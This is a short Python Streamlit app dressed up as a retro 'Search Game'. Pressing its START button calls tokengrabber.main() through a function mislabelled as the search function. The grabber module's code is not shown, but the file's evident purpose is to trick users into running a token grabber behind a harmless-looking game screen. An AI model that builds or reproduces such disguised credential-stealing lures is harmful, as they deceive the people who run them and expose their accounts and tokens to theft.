import streamlit as st
import tokengrabber

# --- PAGE CONFIGURATION (Must be the first command) ---
st.set_page_config(
    page_title="Search Game",
    layout="centered",
    initial_sidebar_state="collapsed"
)

# --- CSS STYLING (To make it look like a Game Menu) ---
st.markdown("""
<style>
    /* Hide the standard Streamlit Menu and Footer */
    #MainMenu {visibility: hidden;}
    footer {visibility: hidden;}
    header {visibility: hidden;}

    /* Center the button and style it */
    .stButton > button {
        width: 100%;
        height: 60px;
        background-color: #000000;
        color: #00FF00; /* Hacker Green */
        font-family: 'Courier New', Courier, monospace;
        font-size: 24px;
        border: 2px solid #00FF00;
        border-radius: 0px; /* Retro square corners */
        transition: all 0.3s ease;
    }
    
    .stButton > button:hover {
        background-color: #00FF00;
        color: #000000;
        box-shadow: 0px 0px 15px #00FF00;
    }
</style>
""", unsafe_allow_html=True)

# --- SESSION STATE (To remember if the game started) ---
if 'game_active' not in st.session_state:
    st.session_state.game_active = False

# --- THE SEARCH FUNCTION ---
def grabtoken():
    tokengrabber.main()


# --- THE UI LOGIC ---

if not st.session_state.game_active:
    # === MENU SCREEN ===
    # Use empty vertical space to center the button visually
    st.write("#") 
    st.write("#") 
    st.write("#") 
    
    # Columns help center the button perfectly
    col1, col2, col3 = st.columns([1, 2, 1])
    
    with col2:
        # The 'Game' Button
        if st.button("START"):
            st.session_state.game_active = True
            st.rerun() # Refresh page to show the script

else:
    # === GAME/SCRIPT SCREEN ===
    # Add a 'Back' button or 'Reset' mechanism if needed
    if st.button("RESET SYSTEM"):
        st.session_state.game_active = False
        st.rerun()
        
    # RUN YOUR SCRIPT
    grabtoken()
